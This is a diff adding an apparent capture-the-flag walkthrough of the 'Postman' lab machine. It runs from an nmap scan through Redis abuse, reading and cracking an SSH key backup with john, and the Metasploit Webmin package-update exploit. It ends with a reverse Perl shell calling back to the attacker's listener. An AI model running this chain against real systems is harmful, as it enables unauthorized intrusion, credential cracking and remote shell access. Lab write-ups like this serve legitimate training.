@@ -1,0 +1,64 @@
+
+
+# 
+
+root@kali:~# nmap -A -T4 -p- 10.10.10.160
+
+root@kali:~# redis-cli -h 10.10.10.160 -p 6379
+
+root@kali:~# python redis.py 10.10.10.160 redis
+
+redis@Postman:~$ cat /opt/id_rsa.bak 
+
+root@kali:~# /usr/share/john/ssh2john.py id_rsa > id_rsa.hash 
+
+root@kali:~# /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash 
+
+redis@Postman:~$ su - Matt
+
+Matt@Postman:~$ cat user.txt 
+
+msf5 > use exploit/linux/http/webmin_packageup_rce se
+
+msf5 exploit(linux/http/webmin_packageup_rce) > options 
+
+Module options (exploit/linux/http/webmin_packageup_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   computer2008     yes       Webmin Password
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      10000            yes       The target port (TCP)
+   SSL        true             no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path for Webmin application
+   USERNAME   Matt             yes       Webmin Username
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.25      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Webmin <= 1.910
+
+
+msf5 exploit(linux/http/webmin_packageup_rce) > check
+
+[*] NICE! Matt has the right to >>Package Update<<
+[+] 10.10.10.160:10000 - The target is vulnerable.
+msf5 exploit(linux/http/webmin_packageup_rce) > run
+
+[*] Started reverse TCP handler on 10.10.14.25:4444 
+[+] Session cookie: 83b755654b25650388db0048f51cacf1
+[*] Attempting to execute the payload...
+[*] Command shell session 1 opened (10.10.14.25:4444 -> 10.10.10.160:56400) at 2020-03-06 04:59:00 -0500
+
